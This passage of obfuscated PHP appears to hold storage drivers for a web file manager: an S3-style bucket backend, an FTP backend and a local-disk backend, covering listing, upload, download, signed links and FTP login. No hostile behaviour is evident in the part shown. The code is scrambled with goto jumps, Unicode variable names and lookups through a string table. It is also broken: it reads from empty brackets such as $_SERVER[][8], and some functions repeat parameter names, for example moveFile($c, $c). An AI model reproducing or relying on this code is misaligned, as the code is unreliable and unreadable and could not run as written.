(isset($b㪷[$A᩵[78]])) { $A넥[$A᩵[78]] = $b㪷[$A᩵[78]]; } return $A넥; goto Aד; Aד: } private function folderInfo($C, $f = false) { goto c; c: $Cļ =& $_SERVER[]; $Dߑʉ = array($Cļ[28] => $this->pathThis($C), $Cļ[76] => $this->getPathOuter($Cļ[8] . $C), $Cļ[29] => $Cļ[77]); if ($f) { return $Dߑʉ; } goto cҊ; cҊ: $Dߑʉ[$Cļ[194]] = $Dߑʉ[$Cļ[84]] = 0; $Dߑʉ[$Cļ[195]] = $Dߑʉ[$Cļ[196]] = !0; if ($C == $Cļ[33]) { return $Dߑʉ; } goto cמȵ; E: return $Dߑʉ; goto aԏŒ; cמȵ: $C = trim($C, $Cļ[8]) . $Cļ[8]; $A = $this->objectMeta($C); if (isset($A[$Cļ[197]])) { $Dߑʉ[$Cļ[194]] = $A[$Cļ[197]]; } goto E; aԏŒ: } private function fileList($d, $Dܬ = '', $d탶ԟ = 0) { goto D댃; D댃: $fփٛ҂ =& $_SERVER[]; $Dȶ = rtrim($d, $fփٛ҂[8]) . $fփٛ҂[8]; $B퇜 = $this->listObjs($Dȶ, null, null, $Dܬ); goto C; C: if (!$B퇜) { return array($fփٛ҂[75] => array(), $fփٛ҂[74] => array()); } $A = $this->listItemCache === !1 ? !1 : !0; $bՊǭ = $E = array(); goto D; bɷŌ: return array($fփٛ҂[75] => $bՊǭ, $fփٛ҂[74] => $E); goto e; D: foreach ($B퇜[$fփٛ҂[198]] as $Cĳ) { goto fٴ; D툳: $dҤ = $C == 0 && substr($cκ̤, strlen($cκ̤) - 1, 1) == $fփٛ҂[8] ? !0 : !1; if ($A) { $this->cacheMethod($fփٛ҂[199], $cκ̤, $dҤ); $this->cacheMethod($fփٛ҂[200], $cκ̤, $Cĳ); } if ($dҤ) { $bՊǭ[] = $cκ̤; continue; } goto f; f: $E[] = $d탶ԟ ? $Cĳ : $cκ̤; goto eˍ; fٴ: $cκ̤ = $Cĳ[$fփٛ҂[28]]; if ($cκ̤ == $Dȶ) { continue; } $C = isset($Cĳ[$fփٛ҂[78]]) ? $Cĳ[$fփٛ҂[78]] : 0; goto D툳; eˍ: } foreach ($B퇜[$fփٛ҂[201]] as $Cĳ) { $bՊǭ[] = $Cĳ[$fփٛ҂[28]]; if ($A) { $this->cacheMethod($fփٛ҂[199], $Cĳ[$fփٛ҂[28]], !0); } } if ($A) { $this->cacheMethod($fփٛ҂[199], $d, !0); } goto bɷŌ; e: } private function listObjs($BϏĉ, $Dկ = null, $A􉋥 = null, $a⹫ = null) { $Fĺ =& $_SERVER[]; $BϏĉ = trim($BϏĉ, $Fĺ[8]); $eӵ = empty($BϏĉ) && $BϏĉ !== $Fĺ[191] ? $Fĺ[33] : $BϏĉ . $Fĺ[8]; return $this->client->getBucket($this->bucket, $eӵ, $Dկ, $A􉋥, $a⹫, !0); } public function has($C , $b齎 = false, $Cօ = true) { goto C̔; C̔: $d =& $_SERVER[]; $C  = trim($C , $d[8]); $b = empty($C ) && $C  !== $d[191] ? $d[33] : $C  . $d[8]; goto BԔ䈍; e: $b͡ = $f̕ = array(); while (!0) { $E = $this->listObjs($C , $Cŉ, $E΅, $Aޭ); if (!$E) { break; } $Cŉ = $E[$d[202]]; $f̫̉ = $E[$d[198]]; $C = $E[$d[201]]; if (empty($f̫̉) && empty($C)) { break; } if (count($f̫̉) == 1 && $f̫̉[0][$d[28]] == $b) { break; } if ($b齎) { if (count($f̫̉)) { $f̫̉ = array_column($f̫̉, $d[28]); $b͡ = array_merge($b͡, $f̫̉); } if (count($C)) { $C = array_column($C, $d[28]); $f̕ = array_merge($f̕, $C); } if ($Cŉ === null) { break; } continue; } if ($Cօ) { if (!empty($f̫̉)) { if (count($f̫̉) > 1 || isset($f̫̉[0][$d[28]]) && $f̫̉[0][$d[28]] != $b) { return !0; } } } else { if (!empty($C)) { return !0; } } if ($Cŉ === null) { break; } } if ($b齎) { $b͡ = array_diff($b͡, array($b)); $b͡ = count(array_unique($b͡)); $f̕ = count(array_unique($f̕)); return array($d[203] => $b͡, $d[204] => $f̕); } goto d᜛; BԔ䈍: $Cŉ = null; $E΅ = 500; $Aޭ = $d[8]; goto e; d᜛: return !1; goto E; E: } public function listAll($f) { $b =& $_SERVER[]; $Fﰋ = $this->fileList($f, $b[33], !0); $dÙ = array(); foreach ($Fﰋ[$b[74]] as $b廞) { $dÙ[$b廞[$b[28]]] = $b廞[$b[78]]; } foreach ($Fﰋ[$b[75]] as $b廞) { if (is_string($b廞)) { $dÙ[$b廞] = 0; } } return $this->listAllFiles($f, array_keys($dÙ), $dÙ); } public function canRead($cе) { $F剻 =& $_SERVER[]; $fä = $this->client->getAccessControlPolicy($this->bucket, $cе); if (!$fä) { return !1; } return in_array($fä, array($F剻[205], $F剻[206], $F剻[207])) ? !0 : !1; } public function canWrite($b熚Ӳ) { $d݇ =& $_SERVER[]; $DΗ֠ = $this->client->getAccessControlPolicy($this->bucket, $b熚Ӳ); if (!$DΗ֠) { return !1; } return in_array($DΗ֠, array($d݇[205], $d݇[206])) ? !0 : !1; } public function getContent($b) { return $this->client->getObject($this->bucket, $b); } public function setContent($E, $fƝ = '', $aΨ = false) { goto fך; b͎: $b = $this->client->putObject($fƝ, $this->bucket, $E, $eƧ΍[192], array(), $BႶ); if (!$b) { return !1; } if ($aΨ) { return !0; } goto A̬; A̬: $this->cacheMethod(null, null); $b = $this->copyFile($E, $E, array($eƧ΍[208] => $b[$eƧ΍[209]])); return $b ? !0 : !1; goto c; fך: $eƧ΍ =& $_SERVER[]; $E = $aΨ ? trim($E, $eƧ΍[8]) . $eƧ΍[8] : $E; $BႶ = get_file_mime(get_path_ext($E)); goto b͎; c: } public function fileSubstr($eߪ, $C֥, $aӕ򗯾) { $bʵ쿺 = $C֥ + $aӕ򗯾 - 1; return $this->client->getObject($this->bucket, $eߪ, array($_SERVER[][210] => "\x62\171\x74\145\x73\x3d{$C֥}\55{$bʵ쿺}")); } public function upload($B, $dɪ, $Cю = false, $EɄɄ = REPEAT_REPLACE) { $BЅ =& $_SERVER[]; $DǷֿ = array($BЅ[208] => @md5_file($dɪ)); $Dڐ = array($BЅ[211] => get_file_mime(get_path_ext($B))); if (IO::size($dɪ) <= 1024 * 1024 * 200) { $fǉ = $this->client->putObjectFile($dɪ, $this->bucket, $B, $BЅ[192], $DǷֿ, $Dڐ); return !empty($fǉ) ? $this->getPathOuter($B) : !1; } $dŊ = $this->client->multiUploadObject($dɪ, $this->bucket, trim($B, $BЅ[8]), $DǷֿ, $Dڐ); return $dŊ ? $this->getPathOuter($B) : !1; } public function download($D蠩, $cߨ) { if (!@is_dir($this->pathFather($cߨ)) && !IO::mkdir($this->pathFather($cߨ))) { return !1; } $a = $this->client->getObject($this->bucket, $D蠩, array(), $cߨ); return $a !== !1 ? $cߨ : !1; } public function link($cʮ, $d郠 = array()) { $c =& $_SERVER[]; if ($this->signVer == $c[212]) { return $this->client->getAuthenticatedURL($this->bucket, $cʮ, 3600 * 12, $d郠); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($cʮ, $c[8]), 3600 * 12, $this->region, array(), !0, $d郠); } public function fileOut($A, $A₏ = false, $eޜ = false, $A = '') { goto Aڞ; b: $Eӷ = get_file_mime(get_path_ext($eޜ)); if ($Eӷ == $Eő[213]) { return parent::fileOut($A, $A₏, $eޜ, $A); } $A₏ = $A₏ ? $Eő[214] : $Eő[215]; goto eѕ; eѕ: $D孓 = array($Eő[216] => $A₏ . $Eő[217] . rawurlencode($eޜ), $Eő[218] => $Eӷ); $b = $this->link($A, $D孓); $this->fileOutLink($b); goto Cʺ; Aڞ: $Eő =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($A, $A₏, $eޜ, $A); } if (!$eޜ) { $eޜ = $this->pathThis($A); } goto b; Cʺ: } public function fileOutServer($E֍𬒑, $A = false, $Fٷƌ = false, $c = '') { parent::fileOut($E֍𬒑, $A, $Fٷƌ, $c); } public function fileOutImageServer($bᗅ, $d = 250) { parent::fileOutImage($bᗅ, $d); } public function hashMd5($b, $BȲ = '') { $Dӄ =& $_SERVER[]; $E = $this->objectMeta($b); if (!$E) { return !1; } $BȲ = $BȲ ? $BȲ : _get($E, $Dӄ[219]); $BȲ = $BȲ ? $BȲ : _get($E, $Dӄ[209], $Dӄ[33]); return $BȲ; } public function uploadFormData($bɈʤ, $f͠ž = 3600) { $bҩ =& $_SERVER[]; $Aʙ = $this->pathFather($bɈʤ); $Cǳݵ = $this->client->getHttpUploadPostParams($this->bucket, $Aʙ, $bҩ[192], $f͠ž); return array_merge((array) $Cǳݵ, array($bҩ[175] => $this->getHost())); } public function multiUploadFormData($Fδ, $Fƥ = 3600) { $F؟ =& $_SERVER[]; $bΤ = gmdate($F؟[220]); $b׃ȕ = array(); $C = $this->client->getUploadId($this->bucket, $Fδ, $b׃ȕ); if (!$C) { return !1; } return array($F؟[221] => $C, $F؟[175] => $this->getHost() . $F؟[8] . $this->pathEncode($Fδ), $F؟[222] => $bΤ, $F؟[93] => $Fδ); } public function multiUploadAuthData($C砡, $E = array()) { goto Eޮ; e¼: $d֞ = implode($d؊[229], $A); $Fַ = base64_encode(hash_hmac($d؊[230], $d֞, $this->secret, !0)); $c = $d؊[231] . $this->accessKey . $d؊[4] . $Fַ; goto F폏; F: $E˛ = $E[$d؊[93]]; unset($E[$d؊[93]]); if (isset($E[$d؊[223]])) { $E[$d؊[222]] = $Cʄ; return $this->listUploadParts($E˛, $E); } goto c; c: $A = array($d؊[224], $d؊[33], $d؊[119], $d؊[33], "\x78\55\x61\155\x7a\x2d\x64\141\164\x65\72{$Cʄ}", $d؊[8] . $this->bucket . $d؊[8] . $this->pathEncode($E˛) . $C̏); if (strpos($C̏, $d؊[225]) === 0) { $A[0] = $d؊[226]; } if (isset($E[$d؊[227]]) && $E[$d؊[227]] == $d؊[228]) { $A[0] = $d؊[228]; } goto e¼; Eޮ: $d؊ =& $_SERVER[]; $Cʄ = isset($E[$d؊[222]]) ? $E[$d؊[222]] : gmdate($d؊[220]); $C̏ = isset($E[$d؊[168]]) ? $E[$d؊[168]] : $d؊[33]; goto F; F폏: if (strpos($C̏, $d؊[225]) === 0) { return array($d؊[232] => $c, $d؊[222] => $Cʄ); } return $c; goto e; e: } public function listUploadParts($e, $f = array()) { goto dҘ; Aт: $Cŉ = $this->multiUploadAuthData($e, $f); if (empty($Cŉ)) { return !1; } return array($bޅ[232] => $Cŉ, $bޅ[222] => $f[$bޅ[222]], $bޅ[234] => $B޶); goto Cɸ; d: if (!$B޶) { return !1; } unset($f[$bޅ[223]], $f[$bޅ[227]]); $f[$bޅ[93]] = $e; goto Aт; dҘ: $bޅ =& $_SERVER[]; $d = str_replace($bޅ[233], $bޅ[33], $f[$bޅ[168]]); $B޶ = $this->client->listParts($this->bucket, $e, $d); goto d; Cɸ: } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($B澌) { $C = $this->objectMeta($B澌); return $C ? $C[$_SERVER[][78]] : 0; } public function info($BƟ) { if ($this->isFolder($BƟ)) { return $this->folderInfo($BƟ); } else { if ($this->isFile($BƟ)) { return $this->fileInfo($BƟ); } } return !1; } public function exist($E) { return $this->isFile($E) || $this->isFolder($E); } public function isFile($e孥) { return !$this->isFolder($e孥) && $this->objectMeta($e孥); } public function isFolder($CފȻ) { return $this->cacheMethod($_SERVER[][199], $CފȻ); } protected function objectMeta($a) { return $this->cacheMethod($_SERVER[][200], $a); } protected function _objectMeta($A) { $EǨѸ =& $_SERVER[]; $A = rtrim($A, $EǨѸ[8]); try { $d՗ = $this->client->getObjectInfo($this->bucket, $A); if (!isset($d՗[$EǨѸ[219]]) && isset($d՗[$EǨѸ[235]])) { $d՗[$EǨѸ[219]] = $d՗[$EǨѸ[235]]; } } catch (Exception $fۜ) { $d՗ = !1; } if (!$d՗) { } return $d՗; } protected function _isFolder($F؃ơ) { goto fѷ߸; Aؒ: return stripos($d۩, $F؃ơ . $F̗[8]) === 0 ? !0 : !1; if (substr($d۩, -1) == $F̗[8]) { return !0; } if (get_path_this($d۩) == get_path_this($F؃ơ)) { return !1; } goto d; fѷ߸: $F̗ =& $_SERVER[]; $F؃ơ = rtrim($F؃ơ, $F̗[8]); if ($F؃ơ == $F̗[33] || $F؃ơ == $F̗[8]) { return !0; } goto FƜ; FƜ: $f = $this->client->getBucket($this->bucket, $F؃ơ, null, 1); if (empty($f[$F̗[198]])) { return !1; } $d۩ = $f[$F̗[198]][0][$F̗[28]]; goto Aؒ; d: return !0; goto dÚ; dÚ: } } define($_SERVER[][236], 1); goto E妠; E: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($C旗) { parent::__construct(); if (count($C旗) > 0) { $this->_init($C旗); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($A՟) { $F՗ =& $_SERVER[]; global $config; $this->appCharset = $config[$F՗[1259]]; $this->systemCharset = $config[$F՗[1260]]; if (isset($A՟[$F՗[1261]]) && $A՟[$F՗[1261]]) { $this->systemCharset = $A՟[$F՗[1261]]; } } public function iconvApp($d撘ڥ) { return $this->iconvTo($d撘ڥ, $this->systemCharset, $this->appCharset); } public function iconvSystem($E겎) { return $this->iconvTo($E겎, $this->appCharset, $this->systemCharset); } public function getPathOuter($a˩) { goto A; c: return $this->pathDriver . $d[8] . ltrim($a˩, $d[8]); goto dߺ; A: $d =& $_SERVER[]; $d = $this->iconvApp($this->pathBase); $a˩ = $this->iconvApp($a˩); goto Fճ; Fճ: if (substr($d, 0, 2) == $d[1262]) { $d = BASIC_PATH . substr($d, 2); } if (substr($a˩, 0, 2) == $d[1262]) { $a˩ = BASIC_PATH . substr($a˩, 2); } $d = KodIO::clear($d); goto F㮴՗; F㮴՗: $a˩ = KodIO::clear($a˩); $a˩ = substr($a˩, strlen($d)); if (empty($this->pathDriver)) { return $a˩; } goto c; dߺ: } private function _init($C = array()) { $cܲނ =& $_SERVER[]; if (!function_exists($cܲނ[1263])) { throw new Exception(LNG($cܲނ[1264])); } $this->config = $C; $this->charsetReset($C); foreach ($C as $fʹ => $eɊ̈́) { if (isset($this->{$fʹ})) { $this->{$fʹ} = $eɊ̈́; } } return $this->_login($C); } private function _login($E) { goto b뽸鄶; DÎɫ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $d = @ftp_login($this->connect, $this->username, $this->userpass); goto Dҋ; Dҋ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $fɨ䃄 = $this->pasv == $b稬[87] ? !0 : !1; @ftp_pasv($this->connect, $fɨ䃄); goto a컾; b뽸鄶: $b稬 =& $_SERVER[]; static $aϨ = array(); $E̓ = md5(json_encode($E)); goto D꽍; a: $cʙ = isset($E䛒[$b稬[174]]) && $E䛒[$b稬[174]] == $b稬[1265] ? !0 : !1; $this->scheme = $cʙ ? $b稬[1266] : $b稬[1267]; $this->port = isset($E䛒[$b稬[176]]) ? $E䛒[$b稬[176]] : 21; goto DÎɫ; D꽍: if (isset($aϨ[$E̓])) { foreach ($aϨ[$E̓] as $E => $Fݑù) { $this->{$E} = $Fݑù; } return !0; } $E䛒 = parse_url(trim($this->server, $b稬[8])); $this->host = $E䛒[$b稬[175]]; goto a; a컾: $aϨ[$E̓] = array($b稬[1268] => $this->connect, $b稬[175] => $this->host, $b稬[174] => $this->scheme, $b稬[176] => $this->port); return $d; goto aԫݳ; aԫݳ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($c, $f = '', $Bޛ = REPEAT_RENAME) { if ($this->setContent($c, $f)) { return $this->getPathOuter($c); } return !1; } public function mkdir($F놇, $C = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $F놇 = $this->iconvSystem($F놇); if ($this->_isFolder($F놇) || @ftp_mkdir($this->connect, $F놇)) { return $this->getPathOuter($F놇); } if (!$this->mkdir($this->pathFather($F놇))) { return !1; } if ($F놇 = @ftp_mkdir($this->connect, $F놇)) { return $this->getPathOuter($F놇); } return !1; } public function copyFile($Fܣ, $a) { goto B; B: if (!$this->_isconn()) { return !1; } $D = $this->pathThis($this->iconvSystem($Fܣ)); $C = $this->tempFile($D); goto Cܶٿݿ; Cܶٿݿ: $dҌ = $this->iconvApp($C); $this->download($Fܣ, $dҌ); $E = $this->upload($a, $dҌ); goto f҃; f҃: $this->tempFileRemve($C); return $E; goto fꙢ; fꙢ: } public function moveFile($Dˎ, $e⺿) { if (!$this->_isconn()) { return !1; } $Dˎ = $this->iconvSystem($Dˎ); $e⺿ = $this->iconvSystem($e⺿); $d = @ftp_rename($this->connect, $Dˎ, $e⺿); return $d ? $this->getPathOuter($e⺿) : !1; } public function delFile($A) { if (!$this->_isconn()) { return !1; } $A = $this->iconvSystem($A); return @ftp_delete($this->connect, $A); } public function delFolder($Aʏ) { goto D䑞; A: foreach ($e滇 as $cƖѯ) { $cƖѯ = $this->iconvSystem($cƖѯ); $B跰 = @ftp_rmdir($this->connect, $cƖѯ); if (!$B跰) { return !1; } } $Aʏ = $this->iconvSystem($Aʏ); return @ftp_rmdir($this->connect, $Aʏ); goto B҇; D䑞: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $e滇 = $F = array(); goto d; d: $this->fileList($Aʏ, $e滇, $F, !0); $this->listItemCache = !0; foreach ($F as $cǨ) { $cƖѯ = $this->iconvSystem($cǨ[$_SERVER[][28]]); $B跰 = @ftp_delete($this->connect, $cƖѯ); if (!$B跰) { return !1; } } goto A; B҇: } public function rename($f֌, $E☕) { goto Bᨏ; E۪: return $Fö ? $this->getPathOuter($Cȑ) : !1; goto F; B킵: $Cȑ = rtrim($F׸, $D[8]) . $D[8] . $B⒇; $Fö = @ftp_rename($this->connect, $f֌, $Cȑ); $Cȑ = $this->iconvApp($Cȑ); goto E۪; aު: $B⒇ = $this->iconvSystem($B⒇); $f֌ = $this->iconvSystem($f֌); $F׸ = $this->pathFather($f֌); goto B킵; Bᨏ: $D =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $B⒇ = $this->fileNameAuto($this->pathFather($f֌), $E☕); goto aު; F: } private function folderInfo($f, $D = false) { $F =& $_SERVER[]; $dױ = array($F[28] => $this->pathThis($f), $F[76] => $this->getPathOuter($F[8] . $f), $F[29] => $F[77]); if ($D) { return $dױ; } $dױ[$F[194]] = $dױ[$F[84]] = 0; $dױ[$F[195]] = $dױ[$F[196]] = !0; return $dױ; } private function fileInfo($cӶ, $D = false, $B꯽Ƣ = array()) { goto Aڟ; cƺ: return $eْ; goto f̥; Aڟ: $BÍ =& $_SERVER[]; $eْ = array($BÍ[28] => $this->pathThis($cӶ), $BÍ[76] => $this->getPathOuter($BÍ[8] . $cӶ), $BÍ[29] => $BÍ[193], $BÍ[78] => isset($B꯽Ƣ[$BÍ[78]]) ? $B꯽Ƣ[$BÍ[78]] : 0, $BÍ[168] => $this->ext($cӶ)); if ($D) { return $eْ; } goto e; dᥕ: $eْ[$BÍ[84]] = @ftp_mdtm($this->connect, $A); if (empty($B꯽Ƣ)) { $B꯽Ƣ = $this->objectMeta($cӶ); if (!$B꯽Ƣ) { return $eْ; } } $eْ[$BÍ[78]] = $B꯽Ƣ[$BÍ[78]]; goto cƺ; e: $eْ[$BÍ[194]] = $eْ[$BÍ[84]] = 0; $eْ[$BÍ[195]] = $eْ[$BÍ[196]] = !0; $A = $this->iconvSystem($cӶ); goto dᥕ; f̥: } public function size($aސ) { $Fņ쏅 = $this->objectMeta($aސ); return $Fņ쏅 ? $Fņ쏅[$_SERVER[][78]] : 0; } public function info($DӲ˅ć) { if ($this->isFile($DӲ˅ć)) { return $this->fileInfo($DӲ˅ć, 0); } else { if ($this->isFolder($DӲ˅ć)) { return $this->folderInfo($DӲ˅ć); } } return !1; } private function fileList($b΄, &$d, &$fڊ, $A༦ = false) { goto aխߕ; Fӎ: $d = array($b˕ݠ[95] => 1, $b˕ݠ[1269] => 1); foreach ($eᥴ as $Dċ躮) { goto c; EȨ: if (substr($Dċ躮, 0, 1) == $b˕ݠ[1270]) { $a캯[$b˕ݠ[29]] = $b˕ݠ[77]; $a캯[$b˕ݠ[78]] = 0; } $F¶ = $a캯[$b˕ݠ[29]] == $b˕ݠ[77] ? !0 : !1; if ($cϐ) { $this->cacheMethod($b˕ݠ[199], $C, $F¶); $this->cacheMethod($b˕ݠ[200], $C, $a캯); } goto Cϫȿ; Cϫȿ: if ($F¶) { $d[] = $C; if ($A༦) { $this->fileList($C, $d, $fڊ, $A༦); } continue; } $fڊ[] = $a캯; goto C; e: if (empty($C) && $C !== $b˕ݠ[191] || isset($d[$C])) { continue; } $C = $this->iconvApp($b΄ . ltrim($C, $b˕ݠ[8])); $a캯 = array($b˕ݠ[28] => $C, $b˕ݠ[29] => $b˕ݠ[193], $b˕ݠ[78] => $BԤ[4]); goto EȨ; c: $BԤ = $this->_listItem($Dċ躮); if ($BԤ[0] == $b˕ݠ[736]) { continue; } $C = $BԤ[8]; goto e; C: } if ($cϐ) { $this->cacheMethod($b˕ݠ[199], $b΄, !0); } goto Aɲ; F: $cϐ = $this->listItemCache === !1 ? !1 : !0; $eᥴ = @ftp_rawlist($this->connect, $b΄); if (!$eᥴ) { $eᥴ = array(); } goto Fӎ; aխߕ: $b˕ݠ =& $_SERVER[]; $b΄ = $this->iconvSystem($b΄); if (!$this->isFolder($b΄)) { return !1; } goto dԖ; dԖ: @ftp_chdir($this->connect, $b˕ݠ[8]); $b΄ = rtrim($b΄, $b˕ݠ[8]) . $b˕ݠ[8]; check_abort(); goto F; Aɲ: } private function _listItem($E) { if (empty($E)) { return array(); } $Dɋԧ = preg_split($_SERVER[][1271], $E); if (count($Dɋԧ) <= 9) { return $Dɋԧ; } $Dɋԧ[8] = trim(substr($E, strpos($E, $Dɋԧ[7]) + strlen($Dɋԧ[7]))); return array_splice($Dɋԧ, 0, 9); } public function listPath($cߨ䒖, $E = false) { goto f; B: return array($C󶰿[75] => $d, $C󶰿[74] => $b˃); goto A䵴; f۫ů: $this->fileList($cߨ䒖, $d, $b˃); foreach ($d as $dەÓ => $f) { $d[$dەÓ] = $this->folderInfo($f, $E); } foreach ($b˃ as $dەÓ => $f) { $b˃[$dەÓ] = $this->fileInfo($f[$C󶰿[28]], $E, $f); } goto B; f: $C󶰿 =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $d = $b˃ = array(); goto f۫ů; A䵴: } public function has($B, $a푞 = false, $B묗 = true) { goto d퐑; f܎: $this->fileList($B, $c𪧋, $Fңē, $f); if ($a푞) { return array($e[203] => count($Fңē), $e[204] => count($c𪧋)); } if ($B묗) { if (count($Fңē)) { return !0; } } else { if (count($c𪧋)) { return !0; } } goto c״; c״: return !1; goto D䅦; d퐑: $e =& $_SERVER[]; $c𪧋 = $Fңē = array(); $f = $a푞 ? !0 : !1; goto f܎; D䅦: } public function listAll($E⸡憣) { goto e; f: $this->fileList($E⸡憣, $AΞۋ, $dҔ, !0); $e̫ = array(); foreach ($dҔ as $dፎ) { $e̫[$dፎ[$F֒[28]]] = $dፎ[$F֒[78]]; } goto F⧣; F⧣: foreach ($AΞۋ as $dፎ) { if (is_string($dፎ)) { $e̫[$dፎ] = 0; } } return $this->listAllFiles($E⸡憣, array_keys($e̫), $e̫); goto bՕ; e: $F֒ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $AΞۋ = $dҔ = array(); goto f; bՕ: } public function getContent($Eʪ޾) { if (!$this->_isconn()) { return !1; } $Eʪ޾ = $this->iconvSystem($Eʪ޾); return $this->fileSubstr($Eʪ޾); } public function setContent($B, $e = '') { goto eۄ; dό: return $E; goto Eĉ; eۄ: if (!$this->_isconn()) { return !1; } $bꨢƬ = $this->pathThis($this->iconvSystem($B)); $f = $this->tempFile($bꨢƬ); goto FĝĐ; FĝĐ: file_put_contents($f, $e); $E = $this->upload($B, $this->iconvApp($f)); $this->tempFileRemve($f); goto dό; Eĉ: } public function fileSubstr($E, $C񋇶 = 0, $Eʈ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($E, $C񋇶, $Eʈ); } private function ftpRequest($b, $e犈 = 0, $c = false) { goto Fݐ; Cɠ: return $c驔; goto Fܒݓ; Fݐ: $b = $this->iconvSystem($b); $Fᛈ = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $d = curl_init(); goto D; bڊ: curl_setopt($d, CURLOPT_RETURNTRANSFER, 1); $c驔 = curl_exec($d); curl_close($d); goto Cɠ; D: curl_setopt($d, CURLOPT_URL, $Fᛈ . $this->pathEncode($b)); curl_setopt($d, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($c) { $Cچ = $e犈 + $c - 1; curl_setopt($d, CURLOPT_RANGE, "{$e犈}\55{$Cچ}"); } goto bڊ; Fܒݓ: } public function upload($eŅ, $b, $Dđ = false, $e܍ = REPEAT_REPLACE) { goto c˺; c˺: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($eŅ))) { return !1; } $eŅ = $this->iconvSystem($eŅ); goto AɎ; AɎ: $b = $this->iconvSystem($b); $f뤇 = ftp_nb_put($this->connect, $eŅ, $b, FTP_BINARY); while ($f뤇 == FTP_MOREDATA) { $f뤇 = ftp_nb_continue($this->connect); } goto f܎; f܎: if ($f뤇 != FTP_FINISHED) { return !1; } return $this->getPathOuter($eŅ); goto bݍ; bݍ: } public function download($Fġ, $Ê = '') { goto cļ; fތ: while ($B == FTP_MOREDATA) { $B = ftp_nb_continue($this->connect); } if ($B != FTP_FINISHED) { return !1; } return $this->iconvApp($Ê); goto DӔ; cļ: if (!$this->_isconn()) { return !1; } $cԳ߰ = $this->pathFather($Ê); if (!IO::mkdir($cԳ߰)) { return !1; } goto AƸ; AƸ: $Fġ = $this->iconvSystem($Fġ); $Ê = $this->iconvSystem($Ê); $B = ftp_nb_get($this->connect, $Ê, $Fġ, FTP_BINARY); goto fތ; DӔ: } public function exist($Fۘ) { return $this->isFile($Fۘ) || $this->isFolder($Fۘ); } public function isFile($CƎ) { return !$this->isFolder($CƎ) && $this->objectMeta($CƎ); } public function isFolder($E) { return $this->cacheMethod($_SERVER[][199], $E); } protected function objectMeta($e) { return $this->cacheMethod($_SERVER[][200], $e); } protected function _objectMeta($cЃ֦) { goto aؽ; f: $b = @ftp_size($this->connect, $cЃ֦); if ($b != -1) { $E͸[$a뱂[78]] = $b; } else { $eǑ꟫ = @ftp_chdir($this->connect, $cЃ֦); if (!$eǑ꟫) { return !1; } $E͸[$a뱂[29]] = $a뱂[77]; } return $E͸; goto a; aؽ: $a뱂 =& $_SERVER[]; if ($cЃ֦ == $a뱂[33] || $cЃ֦ == $a뱂[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto E֨; E֨: $cЃ֦ = $this->iconvSystem($cЃ֦); $E͸ = array($a뱂[28] => $this->iconvApp($cЃ֦), $a뱂[29] => $a뱂[193], $a뱂[78] => 0); @ftp_chdir($this->connect, $a뱂[8]); goto f; a: } protected function _isFolder($e) { $fΥ =& $_SERVER[]; if ($e == $fΥ[33] || $e == $fΥ[8]) { return !0; } $E = $this->_objectMeta($e); return isset($E[$fΥ[29]]) && $E[$fΥ[29]] == $fΥ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Bߓ) { if (substr($Bߓ, 0, 2) == $_SERVER[][1262]) { $Bߓ = BASIC_PATH . substr($Bߓ, 2); } return $Bߓ; } public function iconvApp($c) { $cޯ =& $_SERVER[]; global $config; return $this->iconvTo($c, $config[$cޯ[1260]], $config[$cޯ[1259]]); } public function iconvSystem($E) { $BЙ =& $_SERVER[]; global $config; return $this->iconvTo($E, $config[$BЙ[1259]], $config[$BЙ[1260]]); } public function getPathOuter($bܽ) { goto c鿭; c鿭: $b =& $_SERVER[]; $c壯ԣ = $this->iconvApp($this->pathBase); $bܽ = $this->iconvApp($bܽ); goto C; C: if (substr($c壯ԣ, 0, 2) == $b[1262]) { $c壯ԣ = BASIC_PATH . substr($c壯ԣ, 2); } if (substr($bܽ, 0, 2) == $b[1262]) { $bܽ = BASIC_PATH . substr($bܽ, 2); } $c壯ԣ = KodIO::clear($c壯ԣ); goto eؤ; eؤ: $bܽ = KodIO::clear($bܽ); $bܽ = substr($bܽ, strlen($c壯ԣ)); if (empty($this->pathDriver)) { return $bܽ; } goto f; f: return $this->pathDriver . $b[8] . ltrim($bܽ, $b[8]); goto a܄ȏ; a܄ȏ: } public function mkfile($D, $F؆ = '', $b˹ދ˫ = REPEAT_RENAME) { $D = $this->iconvSystem($D); @touch($D); if ($F؆) { file_put_contents($D, $F؆); } @chmod($D, $this->pathAuth); return is_file($D) ? $this->getPathOuter($D) : !1; } public function mkdir($Eՠ, $A = REPEAT_SKIP) { $Eՠ = $this->iconvSystem($Eՠ); if (is_dir($Eՠ)) { return $this->getPathOuter($Eՠ); } @mkdir($Eՠ, $this->pathAuth, !0); @chmod($Eՠ, $this->pathAuth); return is_dir($Eՠ) ? $this->getPathOuter($Eՠ) : !1; } public function copyFile($B޺, $Cꑎװ) { $this->mkdir($this->pathFather($Cꑎװ)); $B޺ = $this->iconvSystem($B޺); $Cꑎװ = $this->iconvSystem($Cꑎװ); $b = copy_64($B޺, $Cꑎװ); @chmod($Cꑎװ, $this->pathAuth); return $b ? $this->getPathOuter($Cꑎװ) : !1; } public function moveFile($c, $c) { goto Cܧ; d: return $F ? $this->getPathOuter($c) : !1; goto cߜ; aྎ: $F = 